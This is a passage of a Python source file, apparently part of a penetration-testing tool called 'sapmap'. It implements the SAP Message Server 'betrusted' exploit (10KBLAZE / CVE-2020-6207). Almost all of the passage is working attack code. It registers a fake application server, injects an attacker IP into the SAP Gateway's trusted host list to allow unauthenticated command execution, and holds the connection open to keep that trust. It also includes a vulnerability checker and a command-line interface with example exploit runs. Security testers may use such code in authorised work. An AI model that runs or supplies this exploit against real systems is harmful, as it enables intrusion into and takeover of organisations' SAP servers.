                        # > 1023.  Treat values ≤ 1023 as pull-mode (no push port).
                        print(f"[*] AD_GET_NILIST_PORT record: executed={executed_flag} "
                              f"errorno={errorno} body[0:16]={rec_body[:16].hex()} "
                              f"raw_body[0:2]={push_port} "
                              f"({'PUSH port' if push_port > 1023 else 'PULL mode — identity bytes, not a port'})")
                        if push_port <= 1023:
                            push_port = 0   # not a real port; use pull model
                    if push_port > 1023:
                        # PUSH MODEL: dispatcher set up a listener; we connect to it
                        # and send our NILIST data (192.168.2.x IP list).
                        requestor_ip = "192.168.2.209"   # SAP server IP (dispatcher)
                        print(f"[*] AD_GET_NILIST_PORT PUSH MODE: dispatcher listens "
                              f"on {requestor_ip}:{push_port} — connecting to push NILIST")
                        _push_nilist_to_dispatcher(requestor_ip, push_port, attacker_ip)
                        nilist_port_replied = True
                        ni_send(sock, build_nilist_port_reply(fromname, key,
                                                              nilist_port=0,
                                                              toname=hdr.get("fromname", ""),
                                                              iflag=IFLAG_SEND_NAME,
                                                              attacker_ip=attacker_ip))
                    else:
                        # PULL MODEL (kernel 749+): reply with IP records directly
                        # in the ADM response — no TCP listener needed.
                        # gelim reference: 4 records: AD_SELFIDENT + 3× IP entries.
                        requestor = hdr.get("fromname", "")
                        print(f"[*] AD_GET_NILIST_PORT PULL MODE — "
                              f"replying with IP records to requestor={requestor!r}")
                        ni_send(sock, build_nilist_ip_reply(
                            fromname, key, toname=requestor, attacker_ip=attacker_ip))
                        nilist_port_replied = True
                        return True   # NILIST exchange complete
            continue   # handled via eye-catcher scan; skip flag-based dispatch

        # --- Flag-based dispatch (fallback for packets without eye-catcher) ---
        if flag == FLAG_ADMIN:
            adm = pkt[_HEADER_LEN:]
            # Eye-catcher not found above (scan covers whole pkt), so try
            # no-eyecatcher variant: opcode at byte 0 of body
            if len(adm) >= 1:
                first_opcode = adm[0]
                print(f"[*] Wait: FLAG_ADMIN no eye-catcher, byte[0]={first_opcode:#04x}")
            else:
                continue

            if first_opcode == ADM_NILIST:
                print(f"[*] ADM NILIST (no eye) — replying with {attacker_ip}")
                reply = build_nilist_reply(fromname, key, attacker_ip, kernel_new)
                ni_send(sock, reply)
                return True
            if first_opcode == ADM_GET_NILIST_PORT:
                requestor = hdr.get("fromname", "")
                print(f"[*] AD_GET_NILIST_PORT (no eye) — replying with IP records "
                      f"to requestor={requestor!r}")
                ni_send(sock, build_nilist_ip_reply(
                    fromname, key, toname=requestor, attacker_ip=attacker_ip))
                return True

        elif flag in (FLAG_REQUEST, FLAG_ONE_WAY) and iflag == 0:
            if opc.get("opcode") == OPCODE_NILIST:
                print(f"[*] OPCODE NILIST request received — replying with {attacker_ip}")
                reply = build_nilist_reply(fromname, key, attacker_ip, kernel_new)
                ni_send(sock, reply)
                return True
            if opc.get("opcode") == ADM_GET_NILIST_PORT:
                requestor = hdr.get("fromname", "")
                print(f"[*] AD_GET_NILIST_PORT (REQUEST opc) — replying with IP records "
                      f"to requestor={requestor!r}")
                ni_send(sock, build_nilist_ip_reply(
                    fromname, key, toname=requestor, attacker_ip=attacker_ip))
                return True

    return nilist_port_replied   # True if we handled AD_GET_NILIST_PORT


# ---------------------------------------------------------------------------
# High-level public API helpers
# ---------------------------------------------------------------------------

def _derive_appserver_name(ms_name: str, instance_nr: int,
                            attacker_ip: str = "",
                            target_sid: str = "") -> str:
    """Derive a unique app-server name using attacker IP as the hostname.

    Format: <ip_with_dots_as_underscores>_<SID>_NN_<random4hex>
    Example: 192_168_2_11_S4H_00_a3f5

    A random 4-char hex suffix is appended so each betrusted invocation
    registers a DISTINCT name. Without this, a stale registration from a
    previous run causes MSENOTUNIQUE and the registration is rejected.

    SID priority:
      1. target_sid if provided (most reliable — caller knows the real SID)
      2. Extracted from ms_name: first all-uppercase 2–4 char segment
         (works when MS name is e.g. "s4hanadev_S4H_01_ms" → "S4H")
         Note: some MS names are generic (e.g. "MSG_SERVER") and contain
         no useful SID — in that case we fall back to IP_NN format.
    """
    # Use caller-supplied SID if available
    sid = target_sid.upper().strip() if target_sid else ""

    if not sid:
        # Try to extract SID from MS name
        clean = ms_name.strip()
        if clean.endswith("_ms"):
            clean = clean[:-3]
        for part in clean.split("_"):
            # SID: 2–4 chars, all cased chars uppercase (isupper() allows digits),
            # at least one alpha char, not a pure number, and not a generic word.
            if (2 <= len(part) <= 4
                    and part.isupper()
                    and any(c.isalpha() for c in part)
                    and part not in ("MSG", "SAP", "SRV", "MS")):
                sid = part
                break

    # Hostname = attacker IP with dots replaced by underscores
    hostname = attacker_ip.replace(".", "_") if attacker_ip else "sapmap"

    # Random 4-char hex suffix ensures every invocation uses a unique name,
    # preventing MSENOTUNIQUE rejections from stale prior registrations.
    suffix = uuid.uuid4().hex[:4]

    if sid:
        return f"{hostname}_{sid}_{instance_nr:02d}_{suffix}"
    # Fallback: no SID — just hostname + instance
    return f"{hostname}_{instance_nr:02d}_{suffix}"


def check_ms_accessible(host: str, port: int, timeout: float = 5.0) -> dict:
    """Check if the MS internal port (39NN) is reachable from the network.

    Returns:
        accessible: bool — TCP connection succeeded
        error:      str  — error if not accessible
    """
    result = {"accessible": False, "error": ""}
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        result["accessible"] = True
    except Exception as e:
        result["error"] = str(e)
    finally:
        try:
            sock.close()
        except Exception:
            pass
    return result


def check_ms_acl(host: str, port: int, timeout: float = 10.0) -> dict:
    """Check if the MS internal port lacks ACL protection (CVE-2020-6207).

    Attempts to complete the LOGIN_2 handshake.  If the MS replies with a
    session key, it is unauthenticated and vulnerable to the betrusted attack.

    Returns:
        vulnerable:    bool — True if MS lacks ACL protection
        acl_protected: bool — True if MS is accessible but ACL blocks our IP
        session_key:   str  — hex session key from MS login reply
        ms_name:       str  — MS server name from login reply
        errorno:       int  — raw MS error number from login reply (0 = success)
        error:         str  — error message if check failed
    """
    result = {
        "vulnerable": False,
        "acl_protected": False,
        "session_key": "",
        "ms_name": "",
        "errorno": 0,
        "error": "",
    }
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))

        ni_send(sock, pkt_login_2("sapmap_probe"))
        resp = ni_recv(sock, timeout)
        hdr  = ms_parse_header(resp)

        if not hdr:
            result["error"] = "No valid SAPMS header in response"
            return result

        errorno = hdr.get("errorno", 1)
        result["errorno"] = errorno

        if errorno != 0:
            result["acl_protected"] = True
            result["ms_name"] = hdr.get("fromname", "")
            result["error"] = (
                f"MS rejected login (errorno={errorno}) — "
                f"ACL is configured, betrusted not possible from this IP"
            )
            return result

        key = hdr.get("key", b"\x00" * 8)
        result["vulnerable"]  = True
        result["session_key"] = key.hex()
        result["ms_name"]     = hdr.get("fromname", "")

        # Clean logout
        try:
            ni_send(sock, pkt_logout("sapmap_probe", key))
        except Exception:
            pass

    except Exception as e:
        result["error"] = str(e)
    finally:
        try:
            sock.close()
        except Exception:
            pass

    return result


def betrusted(host: str, port: int, attacker_ip: str,
              instance_nr: int = 0,
              our_name: str = "",      # empty = auto-generate from MS name
              target_sid: str = "",    # SAP SID (e.g. "S4H") for realistic name
              diag_port: int = DEFAULT_DIAG_PORT,
              timeout: float = 10.0,
              nilist_wait: float = 60.0,
              dp_version: int = DP_VERSION_V13,
              kernel_new: bool = True,
              verbose: bool = False,
              stop_event=None) -> dict:
    """Execute the betrusted attack against an SAP Message Server.

    Registers a fake ABAP dispatcher with the MS, which then propagates
    attacker_ip to the SAP Gateway's trusted host list, enabling SAPXPG
    unauthenticated command execution from that IP.

    Args:
        host:         MS host (IP or hostname)
        port:         MS internal port (typically 3900 + instance_nr)
        attacker_ip:  IP to inject into the gateway's trusted host list
        instance_nr:  SAP instance number (0–99)
        our_name:     Server name to register as; empty = auto-derive
        target_sid:   SAP SID (e.g. "S4H") used to build the auto name
                      attacker_ip_SID_NN (e.g. "192_168_2_11_S4H_00")
        diag_port:    SAPGUI diag port to advertise (default 3200)
        timeout:      Socket timeout in seconds
        nilist_wait:  Max seconds to wait for NILIST request from MS (0=skip)
        dp_version:   DP info version (11=kernel~720, 13=kernel~745, 14=kernel749+)
        kernel_new:   Use new NILIST record format (True for kernel 745+)
        verbose:      Print debug output to stderr
        stop_event:   threading.Event — when set, exit the hold-alive loop and
                      disconnect.  When provided the function keeps the MS TCP
                      connection open after the NILIST-wait phase so the gateway
                      trust stays active while the caller runs the exploit.
                      The caller MUST eventually set the event to avoid a hang.

    Returns dict:
        success:         bool — attack likely succeeded
        error:           str  — error message on failure
        session_key:     str  — MS session key received (hex)
        change_ip_sent:  bool — ADM CHANGE_IP was sent
        nilist_sent:     bool — ADM NILIST record was sent (inbound reply)
        nilist_response: bool — MS sent NILIST request and we replied
    """
    if verbose:
        logging.basicConfig(level=logging.DEBUG,
                            format="[DBG] %(message)s", stream=sys.stderr)

    # ---- Phase A: probe (separate connection) to get MS name ---------------
    # We need the MS name to derive a realistic app-server name following the
    # hostname_SID_NN convention.  We do this on a SEPARATE socket that we
    # just close (not LOGOUT) — LOGOUT causes the MS to close the TCP
    # connection, so we cannot reuse it for the real registration.
    if not our_name:
        ms_name = ""
        try:
            probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            probe.settimeout(timeout)
            probe.connect((host, port))
            ni_send(probe, pkt_login_2("sapmap_probe"))
            probe_resp = ni_recv(probe, timeout)
            probe_hdr  = ms_parse_header(probe_resp)
            if probe_hdr and probe_hdr.get("errorno", 0) == 0:
                ms_name = probe_hdr.get("fromname", "")
        except Exception:
            pass
        finally:
            try:
                probe.close()
            except Exception:
                pass
        our_name = _derive_appserver_name(ms_name, instance_nr,
                                          attacker_ip, target_sid)
        print(f"[*] MS name: {ms_name!r} → registering as {our_name!r}")

    result = {
        "success": False,
        "error": "",
        "session_key": "",
        "our_name": our_name,
        "change_ip_sent": False,
        "nilist_sent": False,
        "nilist_response": False,
    }

    # ---- Phase B: real registration (fresh connection) ---------------------
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)

    try:
        # ---- Connect -------------------------------------------------------
        print(f"[*] Connecting to MS at {host}:{port}")
        sock.connect((host, port))

        # ---- LOGIN_2 -------------------------------------------------------
        print(f"[*] Sending LOGIN_2 as {our_name!r} (diag_port={diag_port})")
        ni_send(sock, pkt_login_2(our_name, diag_port=diag_port))

        resp = ni_recv(sock, timeout)
        hdr  = ms_parse_header(resp)

        if not hdr:
            result["error"] = "No valid SAPMS header in login response"
            return result

        if hdr.get("errorno", 0) != 0:
            result["error"] = (
                f"MS rejected login (errorno={hdr['errorno']}). "
                f"MS may be protected by ACL."
            )
            return result

        key = hdr.get("key", b"\x00" * 8)
        result["session_key"] = key.hex()
        print(f"[+] Logged in as {our_name!r}  key: {key.hex()}")

        # ---- MOD_STATE: START then ACTIVE ----------------------------------
        dp_info = build_dp_info(our_name, instance_nr, dp_version, attacker_ip)
        print(f"[*] MOD_STATE START  (dp_version={dp_version}, {len(dp_info)}B DP blob)")
        ni_send(sock, pkt_mod_state(our_name, key, MSG_DIA_ENQ, dp_info))
        time.sleep(0.2)
        print(f"[*] MOD_STATE ACTIVE")
        ni_send(sock, pkt_mod_state(our_name, key, MSG_DIA, dp_info))
        time.sleep(0.3)

        # ---- Registration complete ----------------------------------------
        # The attacker IP is already embedded in the MOD_STATE DP blob
        # (dp_addr_from, offset 69-73).  The MS reads it from there and
        # adds it to the internal server table that gets propagated to the
        # gateway on the next MS→GW NILIST cycle.
        #
        # NOTE: sending ANY ADM packet (CHANGE_IP, NILIST, …) from the
        # fake app server *to* the MS is rejected by the MS — these ADMs
        # flow MS→AppServer, not the other way around.  Sending them causes
        # an immediate LOGOUT/disconnect, killing the trust before it
        # propagates.  We therefore send NO ADM packets at all.
        print(f"[*] Registration complete — {attacker_ip} is in the MS server "
              f"table via MOD_STATE DP blob (dp_addr_from)")

        result["change_ip_sent"] = True   # conceptually: IP is in DP blob
        result["success"] = True

        # ---- Wait for MS NILIST request (accelerates trust propagation) ----
        # The MS periodically asks registered app servers for their IP list
        # (NILIST request).  Replying immediately makes the MS push our IP
        # to the gateway right away rather than waiting for its next cycle.
        # We wait here while holding the connection open.
        if nilist_wait > 0:
            print(f"[*] Waiting up to {nilist_wait:.0f}s for NILIST request from MS "
                  f"(connection held open)...")
            got = _wait_and_reply_nilist(
                sock, our_name, key, attacker_ip, nilist_wait,
                kernel_new=kernel_new,
            )
            if got:
                result["nilist_response"] = True
                result["nilist_sent"] = True
                print(f"[+] Replied to AD_GET_NILIST_PORT with 4 IP records — "
                      f"MS will propagate {attacker_ip} to the GW trust list")
            else:
                print(f"[!] No NILIST request in {nilist_wait:.0f}s — "
                      f"MS will propagate our IP on its next cycle "
                      f"(typically every 30-60 s while connected)")

        print()
        print(f"[+] betrusted registration active.")
        print(f"[*] {attacker_ip} in MS server table; "
              f"gateway trust active while TCP connection is held open.")

        # ---- Hold connection alive until caller signals to stop ------------
        # The gateway only trusts attacker_ip while our fake app server is
        # registered in the MS server table — i.e. while the TCP connection
        # is alive.  Disconnecting (or sending LOGOUT) causes the MS to
        # deregister us and remove our IP from the gateway's trust list.
        #
        # When stop_event is provided we hold the connection open so the
        # caller can run the gateway exploit while we are still registered.
        if stop_event is not None:
            print(f"[*] Holding MS connection open (waiting for exploit to complete)...")
            while not stop_event.is_set():
                # Keep reading with a short timeout so we can check stop_event
                # between reads and reply to any NILIST requests that arrive.
                try:
                    pkt = ni_recv(sock, timeout=0.5)
                except (socket.timeout, TimeoutError):
                    continue   # idle — keep holding
                except (ConnectionError, OSError):
                    logger.debug("Hold phase: MS closed connection")
                    break
                if len(pkt) >= _HEADER_LEN:
                    hdr2 = ms_parse_header(pkt)
                    if not hdr2:
                        continue
                    flag2  = hdr2.get("flag", -1)
                    iflag2 = hdr2.get("iflag", -1)
                    try:
                        ip_bytes = socket.inet_aton(attacker_ip)
                        ip_tag = " [OUR IP FOUND]" if ip_bytes in pkt else ""
                    except Exception:
                        ip_tag = ""
                    print(f"[*] Hold: MS pkt flag={flag2:#04x} iflag={iflag2:#04x} "
                          f"len={len(pkt)} body={pkt[_HEADER_LEN:_HEADER_LEN+24].hex()}"
                          f"{ip_tag}")
                    try:
                        # Scan full packet for ADM eye-catcher (MS sends ADM
                        # inside FLAG_REQUEST packets on newer kernels)
                        adm_pos2 = pkt.find(_ADM_EYE, _HEADER_LEN)
                        if adm_pos2 >= 0:
                            adm2 = pkt[adm_pos2:]
                            if len(adm2) >= _ADM_HDR_LEN + 1:
                                opcode = adm2[_ADM_HDR_LEN]
                                print(f"[*] Hold: ADM eye at offset {adm_pos2} "
                                      f"opcode={opcode:#04x}")
                                if opcode == ADM_NILIST:
                                    print("[*] Hold: ADM NILIST — replying")
                                    ni_send(sock, build_nilist_reply(
                                        our_name, key, attacker_ip, kernel_new))
                                    result["nilist_response"] = True
                                    result["nilist_sent"] = True
                                elif opcode == ADM_GET_NILIST_PORT:
                                    push_port2 = 0
                                    if len(adm2) >= _ADM_HDR_LEN + _ADM_REC_SIZE:
                                        rb = adm2[_ADM_HDR_LEN + 3:_ADM_HDR_LEN + _ADM_REC_SIZE]
                                        raw_pp = struct.unpack("!H", rb[:2])[0]
                                        # Values ≤ 1023 are identity bytes, not real ports
                                        push_port2 = raw_pp if raw_pp > 1023 else 0
                                        print(f"[*] Hold: AD_GET_NILIST_PORT "
                                              f"body[0:16]={rb[:16].hex()} "
                                              f"raw={raw_pp} push_port={push_port2}")
                                    requestor = hdr2.get("fromname", "")
                                    if push_port2 > 1023:
                                        print(f"[*] Hold: PUSH mode port={push_port2}")
                                        _push_nilist_to_dispatcher(
                                            "192.168.2.209", push_port2, attacker_ip)
                                        ni_send(sock, build_nilist_port_reply(
                                            our_name, key, nilist_port=0,
                                            toname=requestor,
                                            iflag=IFLAG_SEND_NAME,
                                            attacker_ip=attacker_ip))
                                    else:
                                        # PULL MODEL: reply with IP records directly
                                        print(f"[*] Hold: AD_GET_NILIST_PORT PULL — "
                                              f"replying with IP records to "
                                              f"requestor={requestor!r}")
                                        ni_send(sock, build_nilist_ip_reply(
                                            our_name, key,
                                            toname=requestor,
                                            attacker_ip=attacker_ip))
                                        result["nilist_response"] = True
                                        result["nilist_sent"] = True
                                else:
                                    print(f"[*] Hold: ADM opcode {opcode:#04x} (ignored)")
                        elif flag2 == FLAG_ADMIN:
                            adm = pkt[_HEADER_LEN:]
                            opcode = adm[0] if len(adm) >= 1 else -1
                            print(f"[*] Hold: FLAG_ADMIN no eye, byte[0]={opcode:#04x}")
                            if opcode == ADM_NILIST:
                                ni_send(sock, build_nilist_reply(
                                    our_name, key, attacker_ip, kernel_new))
                                result["nilist_response"] = True
                                result["nilist_sent"] = True
                            elif opcode == ADM_GET_NILIST_PORT:
                                requestor = hdr2.get("fromname", "")
                                print(f"[*] Hold: AD_GET_NILIST_PORT (no eye) — "
                                      f"replying with IP records to requestor={requestor!r}")
                                ni_send(sock, build_nilist_ip_reply(
                                    our_name, key,
                                    toname=requestor,
                                    attacker_ip=attacker_ip))
                                result["nilist_response"] = True
                                result["nilist_sent"] = True
                        elif flag2 in (FLAG_REQUEST, FLAG_ONE_WAY):
                            opc2 = ms_parse_opcode(pkt)
                            opc_val = opc2.get("opcode", -1)
                            if opc_val == OPCODE_NILIST:
                                print("[*] Hold: OPCODE NILIST (REQUEST) — replying")
                                ni_send(sock, build_nilist_reply(
                                    our_name, key, attacker_ip, kernel_new))
                                result["nilist_response"] = True
                                result["nilist_sent"] = True
                            elif opc_val == ADM_GET_NILIST_PORT:
                                requestor = hdr2.get("fromname", "")
                                print(f"[*] Hold: AD_GET_NILIST_PORT (REQ) — "
                                      f"replying with IP records to requestor={requestor!r}")
                                ni_send(sock, build_nilist_ip_reply(
                                    our_name, key,
                                    toname=requestor,
                                    attacker_ip=attacker_ip))
                                result["nilist_response"] = True
                                result["nilist_sent"] = True
                    except (ConnectionError, OSError):
                        break
            print(f"[*] Stop signal received — disconnecting from MS")
        else:
            # Standalone / CLI mode: keep connection open for nilist_wait
            # more seconds so the caller has time to test manually.
            time.sleep(0.5)

        # Drop the connection without sending LOGOUT — sending LOGOUT would
        # immediately deregister us and undo the trust injection.

    except ConnectionRefusedError:
        result["error"] = (
            f"Port {port} refused — MS internal port not exposed externally. "
            f"Try --instance 0..9 or check firewall rules for port 39NN."
        )
        print(f"[-] {result['error']}")
    except Exception as e:
        result["error"] = str(e)
        print(f"[-] Error: {e}")
        logger.debug("Exception details:", exc_info=True)
    finally:
        try:
            sock.close()
        except Exception:
            pass

    return result


# ---------------------------------------------------------------------------
# SAPMAP integration hooks
# ---------------------------------------------------------------------------

def sapmap_check_ms(host: str, instance_nr: int, timeout: float = 5.0) -> dict:
    """SAPMAP integration: check MS internal port for CVE-2020-6207 (betrusted).

    Runs check_ms_accessible + check_ms_acl for a given instance.
    Returns a combined result dict suitable for node enrichment.

    Returns:
        port:        int  — MS internal port checked (39NN)
        accessible:  bool — port is reachable
        vulnerable:  bool — MS lacks ACL (login succeeded)
        session_key: str  — hex session key if logged in
        ms_name:     str  — MS server name if logged in
        error:       str  — error message
    """
    port = ms_port(instance_nr)
    result = {
        "port":          port,
        "accessible":    False,
        "vulnerable":    False,
        "acl_protected": False,
        "session_key":   "",
        "ms_name":       "",
        "error":         "",
    }

    acc = check_ms_accessible(host, port, timeout)
    result["accessible"] = acc["accessible"]
    if not acc["accessible"]:
        result["error"] = acc["error"]
        return result

    acl = check_ms_acl(host, port, timeout)
    result["vulnerable"]    = acl["vulnerable"]
    result["acl_protected"] = acl.get("acl_protected", False)
    result["session_key"]   = acl["session_key"]
    result["ms_name"]       = acl["ms_name"]
    result["error"]         = acl["error"]
    return result


# ---------------------------------------------------------------------------
# CLI entry point
# ---------------------------------------------------------------------------

def _build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=(
            "SAP Message Server betrusted exploit (10KBLAZE / CVE-2020-6207)\n"
            "Injects attacker IP into SAP Gateway trusted host list via MS registration.\n"
            "For authorized security testing only."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Check MS ACL:
    %(prog)s check-acl -t 10.0.1.5 -n 0

  Run betrusted attack (inject attacker IP):
    %(prog)s exploit -t 10.0.1.5 -n 0 -a 1.2.3.4

  Old kernel (720), no NILIST wait:
    %(prog)s exploit -t 10.0.1.5 -n 1 -a 1.2.3.4 --dp-version 11 --old-kernel --nilist-wait 0
""",
    )
    sub = parser.add_subparsers(dest="command", required=True)

    # ---- check-acl ---------------------------------------------------------
    p_check = sub.add_parser("check-acl",
                              help="Check if MS internal port lacks ACL (CVE-2020-6207)")
    p_check.add_argument("-t", "--target", required=True,
                         metavar="HOST", help="MS host (IP or hostname)")
    p_check.add_argument("-p", "--port", type=int, default=0,
                         help="MS internal port (default: auto from --instance)")
    p_check.add_argument("-n", "--instance", type=int, default=0,
                         metavar="NN", help="SAP instance number 0-99 (default: 0)")
    p_check.add_argument("--timeout", type=float, default=10.0)

    # ---- exploit -----------------------------------------------------------
    p_ex = sub.add_parser("exploit",
                           help="Execute betrusted attack to gain gateway trust")
    p_ex.add_argument("-t", "--target", required=True,
                      metavar="HOST", help="MS host (IP or hostname)")
    p_ex.add_argument("-p", "--port", type=int, default=0,
                      help="MS internal port (default: auto from --instance)")
    p_ex.add_argument("-n", "--instance", type=int, default=0,
                      metavar="NN", help="SAP instance number 0-99 (default: 0)")
    p_ex.add_argument("-a", "--attacker-ip", required=True,
                      metavar="IP", help="Attacker IP to inject into gateway trust list")
    p_ex.add_argument("--our-name", default=DEFAULT_REG_NAME,
                      help=f"Server name to register as (default: {DEFAULT_REG_NAME})")
    p_ex.add_argument("--diag-port", type=int, default=DEFAULT_DIAG_PORT,
                      help=f"SAPGUI diag port to advertise (default: {DEFAULT_DIAG_PORT})")
    p_ex.add_argument("--dp-version", type=int, default=DP_VERSION_V13,
                      choices=[11, 13, 14],
                      help="DP info version: 11=kernel~720, 13=kernel~745 (default), 14=kernel749+")
    p_ex.add_argument("--old-kernel", action="store_true",
                      help="Use old NILIST record format for kernel ~720")
    p_ex.add_argument("--nilist-wait", type=float, default=60.0,
                      metavar="SECS",
                      help="Seconds to wait for NILIST request from MS (0=skip, default: 60)")
    p_ex.add_argument("--timeout", type=float, default=10.0)
    p_ex.add_argument("-v", "--verbose", action="store_true",
                      help="Print debug output")

    return parser


def main() -> None:
    args = _build_parser().parse_args()
    port = args.port or ms_port(args.instance)

    if args.command == "check-acl":
        print(f"[*] Checking MS internal port {port} on {args.target}")
        acc = check_ms_accessible(args.target, port, args.timeout)
        if not acc["accessible"]:
            print(f"[-] Not reachable: {acc['error']}")
            sys.exit(1)
        print(f"[+] Port {port} is accessible")

        result = check_ms_acl(args.target, port, args.timeout)
        if result["vulnerable"]:
            print(f"[+] VULNERABLE: MS lacks ACL protection (CVE-2020-6207)")
            print(f"    MS server name : {result['ms_name']!r}")
            print(f"    Session key    : {result['session_key']}")
        elif result.get("acl_protected"):
            print(f"[~] ACL PROTECTED: Port accessible but MS blocks this IP")
            print(f"    errorno        : {result['errorno']}")
            print(f"    betrusted requires a whitelisted IP (SAP host, SAPRouter, etc.)")
        else:
            print(f"[-] NOT accessible: {result['error']}")
        sys.exit(0 if result["vulnerable"] else 1)

    elif args.command == "exploit":
        # Hold the MS connection open after NILIST so the gateway trust
        # stays active (trust is revoked when we disconnect).  Ctrl+C
        # or SIGTERM cleanly shuts down.
        hold = threading.Event()
        try:
            result = betrusted(
                host=args.target,
                port=port,
                attacker_ip=args.attacker_ip,
                instance_nr=args.instance,
                our_name=args.our_name,
                diag_port=args.diag_port,
                timeout=args.timeout,
                nilist_wait=args.nilist_wait,
                dp_version=args.dp_version,
                kernel_new=not args.old_kernel,
                verbose=args.verbose,
                stop_event=hold,
            )
        except KeyboardInterrupt:
            print("\n[*] Interrupted — disconnecting from MS (trust revoked)")
            result = {"success": True}
        sys.exit(0 if result["success"] else 1)


if __name__ == "__main__":
    main()
